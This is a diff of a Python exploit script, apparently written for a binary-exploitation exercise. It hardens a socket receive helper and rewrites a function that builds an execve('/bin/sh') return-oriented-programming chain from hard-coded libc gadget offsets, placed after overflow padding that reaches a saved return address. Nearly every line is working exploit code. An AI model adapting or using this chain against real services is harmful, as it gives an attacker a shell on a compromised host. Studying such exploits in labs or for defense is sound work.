@@ -8,40 +8,38 @@ def p(a):
 def recvn(s, n):
     b = b''
     while len(b) < n:
-        b += s.recv(n - len(b))
+        r = s.recv(n - len(b))
+        if not r:
+            raise EOFError
+        b += r
     return b
 
-# return the execve rop chain, given the initial
+# return the adapted output of Ropper's execve chain generator,
+# given the initial
 # padding (to reach the saved return address) and
 # the load address of libc
 def mkrop(pad, libc_base):
-    rebase_0 = lambda x : p(x + libc_base)
+    rebase = lambda offset: p(libc_base + offset)
     rop = pad
-    rop += rebase_0(0x0000000000028489) # 0x0000000000028489: pop r13; ret; 
+    rop += rebase(0x28489)
     rop += b'//bin/sh'
-    rop += rebase_0(0x0000000000030fff) # 0x0000000000030fff: pop rbx; ret; 
-    rop += rebase_0(0x00000000001be1a0)
-    rop += rebase_0(0x0000000000056022) # 0x0000000000056022: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
-    rop += p(0xdeadbeefdeadbeef)
-    rop += p(0xdeadbeefdeadbeef)
-    rop += p(0xdeadbeefdeadbeef)
-    rop += p(0xdeadbeefdeadbeef)
-    rop += rebase_0(0x0000000000028489) # 0x0000000000028489: pop r13; ret; 
-    rop += p(0x0000000000000000)
-    rop += rebase_0(0x0000000000030fff) # 0x0000000000030fff: pop rbx; ret; 
-    rop += rebase_0(0x00000000001be1a8)
-    rop += rebase_0(0x0000000000056022) # 0x0000000000056022: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
-    rop += p(0xdeadbeefdeadbeef)
-    rop += p(0xdeadbeefdeadbeef)
-    rop += p(0xdeadbeefdeadbeef)
-    rop += p(0xdeadbeefdeadbeef)
-    rop += rebase_0(0x0000000000026796) # 0x0000000000026796: pop rdi; ret; 
-    rop += rebase_0(0x00000000001be1a0)
-    rop += rebase_0(0x000000000002890f) # 0x000000000002890f: pop rsi; ret; 
-    rop += rebase_0(0x00000000001be1a8)
-    rop += rebase_0(0x00000000000cb1cd) # 0x00000000000cb1cd: pop rdx; ret; 
-    rop += rebase_0(0x00000000001be1a8)
-    rop += rebase_0(0x000000000003ee88) # 0x000000000003ee88: pop rax; ret; 
-    rop += p(0x000000000000003b)
-    rop += rebase_0(0x00000000000580da) # 0x00000000000580da: syscall; ret; 
+    rop += rebase(0x30fff)
+    rop += rebase(0x1be1a0)
+    rop += rebase(0x56022)
+    rop += p(0xdeadbeefdeadbeef)*4
+    rop += rebase(0x28489)
+    rop += p(0)
+    rop += rebase(0x30fff)
+    rop += rebase(0x1be1a8)
+    rop += rebase(0x56022)
+    rop += p(0xdeadbeefdeadbeef)*4
+    rop += rebase(0x26796)
+    rop += rebase(0x1be1a0)
+    rop += rebase(0x2890f)
+    rop += rebase(0x1be1a8)
+    rop += rebase(0xcb1cd)
+    rop += rebase(0x1be1a8)
+    rop += rebase(0x3ee88)
+    rop += p(59)
+    rop += rebase(0x580da)
     return rop
